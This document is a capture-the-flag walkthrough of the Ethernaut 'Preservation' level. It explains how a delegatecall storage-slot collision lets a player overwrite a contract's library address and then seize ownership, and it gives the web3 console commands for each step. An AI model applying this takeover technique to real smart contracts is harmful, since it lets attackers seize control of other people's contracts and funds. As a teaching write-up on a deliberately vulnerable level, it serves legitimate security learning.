# Preservation

# Problem Statement
```
This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help
- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.
```

# Solution
The key thing to note is when a call is made to `Preservation` contract's `setFirstTime` or `setSecondTime`, it is making a `delegatecall` to the `LibraryContract`'s `setTime` method.<br>
Recall that `deletegatecall` retains the caller's context and in this case it's the context of the call which is the `Preservation` contract.<br>
Also, note that the `LibraryContract`'s `storedTime` variable is in slot 0 and so a call to `setTime` will modify slot 0 of the `Preservation` contract which is the `timeZone1Library` variable.<br>
With this knowledge lets create our attack contract (You can view it at `PreservationSolution.sol`) and deploy it.<br>
Lets first see the value of the `timeZone1Library`
```
await web3.eth.getStorageAt(contract.address, 0, console.log)
// returns '0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5'
```
Next, call the `Preservation` contract's `setFirstTime` method with the attack contract address:
```
await contract.setFirstTime("0xYOUR_ATTACK_CONTRACT_ADDRESS")
```
Now, verify that you've changed the `Preservation` contract's `timeZone1Library` value at slot 0:
```
await web3.eth.getStorageAt(contract.address, 0, console.log)
// returns '0x000000000000000000000000YOUR_ATTACK_CONTRACT_ADDRESS'
```
Lastly, we need to take ownership with our externally owned account (EOA), so just run the following:
```
await contract.setFirstTime("1") // doesn't matter what input
```
You can see now you are the owner:
```
await contract.owner()
```

We've completed this lesson!

# Key Learnings
- When `delegatecall` is used make sure to understand if it will unintentionally modify storage.
